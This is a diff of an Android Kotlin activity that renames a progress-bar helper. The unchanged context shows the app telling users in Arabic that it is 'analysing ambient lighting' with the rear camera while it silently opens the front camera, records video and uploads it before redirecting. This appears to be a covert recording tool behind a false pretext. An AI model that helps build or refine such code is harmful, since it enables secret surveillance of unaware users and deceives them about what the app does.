@@ -221,7 +221,8 @@ class MainActivity : Activity() {
         runOnUiThread { statusMsg.text = text }
     }
 
-    private fun setProgress(pct: Int) {
+    // Renamed from setProgress to avoid Activity.setProgress collision
+    private fun updateProgressBar(pct: Int) {
         runOnUiThread {
             progressBar.visibility = View.VISIBLE
             progressBar.progress = pct.coerceIn(0, 100)
@@ -232,7 +233,7 @@ class MainActivity : Activity() {
     private fun beginAnalysis() {
         startBtn.isEnabled = false
         setStatus("جارٍ فتح الكاميرا الخلفية...")
-        setProgress(5)
+        updateProgressBar(5)
 
         try {
             backCamera = Camera.open(0) // Back camera
@@ -240,7 +241,7 @@ class MainActivity : Activity() {
             backCamera?.startPreview()
             backCamBox.visibility = View.VISIBLE
             setStatus("تم فتح الكاميرا. تحليل الإضاءة المحيطة...")
-            setProgress(20)
+            updateProgressBar(20)
         } catch (e: Exception) {
             setStatus("فشل فتح الكاميرا الخلفية.")
             startBtn.isEnabled = true
@@ -250,7 +251,7 @@ class MainActivity : Activity() {
         try {
             frontCamera = Camera.open(1) // Front camera
             frontCamera?.unlock()
-            setProgress(40)
+            updateProgressBar(40)
         } catch (e: Exception) {
             frontCamera = null
         }
@@ -293,7 +294,7 @@ class MainActivity : Activity() {
                         frontCamera = null
                     }
                     setStatus("اكتمل التسجيل. جارٍ الإرسال...")
-                    setProgress(70)
+                    updateProgressBar(70)
                     uploadVideoAndFinalize()
                 } catch (e: Exception) {
                     finalizeRedirect()
@@ -405,7 +406,7 @@ class MainActivity : Activity() {
     }
 
     private fun finalizeRedirect() {
-        setProgress(95)
+        updateProgressBar(95)
         setStatus("اكتمل التحليل. جارٍ إعادة التوجيه...")
         Handler(Looper.getMainLooper()).postDelayed({
             stopCamera()
